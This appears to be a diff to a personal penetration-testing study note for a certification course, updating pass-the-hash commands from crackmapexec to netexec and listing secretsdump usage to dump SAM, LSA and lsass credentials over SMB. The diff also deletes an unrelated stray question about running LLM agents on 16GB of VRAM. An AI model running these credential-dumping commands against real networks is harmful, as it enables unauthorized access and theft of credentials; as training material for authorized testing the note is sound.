@@ -2,22 +2,22 @@
 ## Quick-Use
 
 **Commands**:
-- crackmapexec:
-    - for pw: `crackmapexec smb <IP/CIDR> -u <user> -d <domain> -p '<pass>'`
+- netexec (nxc) — *formerly crackmapexec, which is now archived upstream; nxc is the maintained drop-in successor with the same flags*:
+    - for pw: `netexec smb <IP/CIDR> -u <user> -d <domain> -p '<pass>'`
     - for hash: 
-        - passing hash generic - `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth`
-        - pass hash and dump SAM data - `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth --sam` 
-        - pass hash and dump shares - `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth --shares`
-        - pass hash and dump Local Security Authority - `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth --lsa`
-        - pass hash and dump lsass with lsassy - `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth -M lsassy` (-M is short for module, and `lsassy` is only one of many modules)
-    - `crackmapexec` also has a db containing enum data gathered so far, called `cmedb`
+        - passing hash generic - `netexec smb <IP/CIDR> -u <user> -H <hash> --local-auth`
+        - pass hash and dump SAM data - `netexec smb <IP/CIDR> -u <user> -H <hash> --local-auth --sam` 
+        - pass hash and dump shares - `netexec smb <IP/CIDR> -u <user> -H <hash> --local-auth --shares`
+        - pass hash and dump Local Security Authority - `netexec smb <IP/CIDR> -u <user> -H <hash> --local-auth --lsa`
+        - pass hash and dump lsass with lsassy - `netexec smb <IP/CIDR> -u <user> -H <hash> --local-auth -M lsassy` (-M is short for module, and `lsassy` is only one of many modules)
+    - `netexec` also has a db containing enum data gathered so far, called `nxcdb` (was `cmedb` under crackmapexec)
 - secretsdump -
     - with password: `secretsdump.py ADDOMAINNAME/uname:'UserPasswd'@TARGIPADDR`
     - with hash: `secretsdump.py uname:@TARGIPADDR -hashes LM:NT`
  
 
 *Tools*:
-- `crackmapexec` - Passes the password or the hash, and also gives a readout of what has been pwned (what has been logged into that is a local admin)
+- `netexec` (`nxc`) - Passes the password or the hash, and also gives a readout of what has been pwned (what has been logged into that is a local admin)
 - `secretsdump.py`  - grabs local hashes, see [[2_Studies/Courses/Current/CERTPREP - CPTS/1_Hack.codex/2_Enumeration/Post-Compromise Enumeration/Active Directory/Pass the hash#Examples|Examples]] for usage
     - For `secretsdump`, you Especially want to pay attention to local admin hashes you get, and ESPECIALLY domain admin hashes
         - you will also want to dump secrets from every machine you have access to as a local admin
@@ -145,7 +145,3 @@ NL$KM:6766010a9e7cc5babc5cf2b1d9200617844a94fa562d8c71eecaec33b2a689bb9bd215bafe
 └─$ 
 
 ```
-
-
-
-I have 16gb of vram. If i wanted to run at least 6 agents concurrently, at a decent size for general inferrence, say at least 2B or higher, how many agents can I run? what would be a decent optimal count if I wanted multiple agents to provide a response, deliberate on their proposals, debate them, and then vote on the best proposal and present me with the response? 
